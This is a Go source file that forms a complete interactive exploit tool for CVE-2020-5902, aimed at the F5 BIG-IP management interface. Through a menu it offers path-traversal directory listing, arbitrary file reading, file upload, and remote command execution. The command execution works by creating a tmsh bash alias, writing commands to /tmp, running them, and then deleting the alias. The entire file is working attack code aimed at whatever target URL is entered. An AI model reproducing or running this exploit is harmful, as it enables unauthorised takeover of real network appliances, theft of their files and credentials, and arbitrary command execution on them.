package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func help1() {
	fmt.Println("----------------------------")
	fmt.Println("Directory traversal:1")
	fmt.Println("File reading:2")
	fmt.Println("File upload:3")
	fmt.Println("Command exec:4")
	fmt.Println("----------------------------")
}

func readInput() string {
	reader2 := bufio.NewReader(os.Stdin)
	url1, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}
	return string(url1)
}

func directory_traversal(url1, file_path string) {
	url2 := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=" + file_path
	var client http.Client
	req1, err := http.NewRequest("GET", url2, nil)
	if err != nil {
		panic(err)
	}
	req1.Header.Add("User-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	body1, err := ioutil.ReadAll(rep1.Body)
	fmt.Println(string(body1))
}

func file_read(url1, file_name string) {
	url2 := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=" + file_name
	var client http.Client
	req1, err := http.NewRequest("GET", url2, nil)
	if err != nil {
		panic(err)
	}
	req1.Header.Add("User-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	body1, err := ioutil.ReadAll(rep1.Body)
	fmt.Println(string(body1))

}

func file_upload(url1, payload1, file_name string) {
	url2 := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp"
	var client http.Client
	req1, err := http.NewRequest("POST", url2, strings.NewReader(payload1))
	if err != nil {
		panic(err)
	}
	req1.Header.Add("User-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
	req1.Header.Add("Content-Type", "application/json")
	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	fmt.Println(rep1.Status)

}

func tmshCmd_exit(url1, file, cmd string) {
	tmshcmd_url := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"
	rep1, err := http.Get(tmshcmd_url)
	if err != nil {
		panic(err)
	}

	if strings.Contains(rep1.Status, "200") {
		fmt.Println("[+] tmshCmd.jsp Exit")
		fmt.Println("[+] create cli alias private list command bash")
		upload_exit(url1, file, cmd)
	} else {
		fmt.Println("[-] tmshCmd.jsp No Exit")
	}
}

func upload_exit(url1, file, cmd string) {
	filesave_url := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/" + file + "&content=" + cmd
	rep1, err := http.Get(filesave_url)
	if err != nil {
		panic(err)
	}
	if strings.Contains(rep1.Status, "200") {
		fmt.Println("[+] fileSave.jsp Exit")
		list_command(url1, file)
	} else {
		fmt.Println("[-] fileSave.jsp No Exit")
	}
}

func list_command(url1, file string) {
	rce_url := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/" + file
	rep1, err := http.Get(rce_url)
	if err != nil {
		panic(err)
	}

	if strings.Contains(rep1.Status, "200") {
		body1, err := ioutil.ReadAll(rep1.Body)
		if err != nil {
			panic(err)
		}
		if len(body1) > 33 {
			fmt.Println("[+] Command Successfull")
			fmt.Println("-----------")
			fmt.Println(string(body1))
			fmt.Println("-----------")
			delete_list(url1)
		}
	} else {
		fmt.Println("[-] Command Failed")
	}
}

func delete_list(url1 string) {
	delete_url := url1 + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list"
	rep1, err := http.Get(delete_url)
	if err != nil {
		panic(err)
	}
	if strings.Contains(rep1.Status, "200") {
		fmt.Println("[+] delete cli alias private list Successfull")
	} else {
		fmt.Println("[-] delete cli alias private list Failed")
	}
}

func command_exec(url1, file, cmd string) {
	tmshCmd_exit(url1, file, cmd)
}

func main() {
	fmt.Println("[*] CVE-2020-5902 test starting")
	help1()
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("input your choose: ")
	choose1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}

	if string(choose1) == "1" {
		fmt.Println("[*] your choose Directory traversal")
		fmt.Print("[*] input url: ")
		url1 := readInput()
		fmt.Print("[*] input path: ")
		file_path := readInput()
		directory_traversal(url1, file_path)
	} else if string(choose1) == "2" {
		fmt.Println("[*] your choose File reading")
		fmt.Print("[*] input url: ")
		url1 := readInput()
		fmt.Print("[*] input file name: ")
		file_name := readInput()
		file_read(url1, file_name)
	} else if string(choose1) == "3" {
		fmt.Println("[*] your choose File upload")
		fmt.Print("[*] input url: ")
		url1 := readInput()
		fmt.Print("[*] input payload1: ")
		payload1 := readInput()
		fmt.Print("[*] input file name: ")
		file_name := readInput()
		file_upload(url1, payload1, file_name)
	} else if string(choose1) == "4" {
		fmt.Println("[*] your choose Command exec")
		for {
			fmt.Print("[*] input url: ")
			url1 := readInput()
			fmt.Print("[*] input file name: ")
			file_name := readInput()
			fmt.Print("[*] input command/quit input `exit`: ")
			payload1 := readInput()
			if payload1 == "exit" {
				break
			}
			command_exec(url1, file_name, payload1)
		}
	}
}
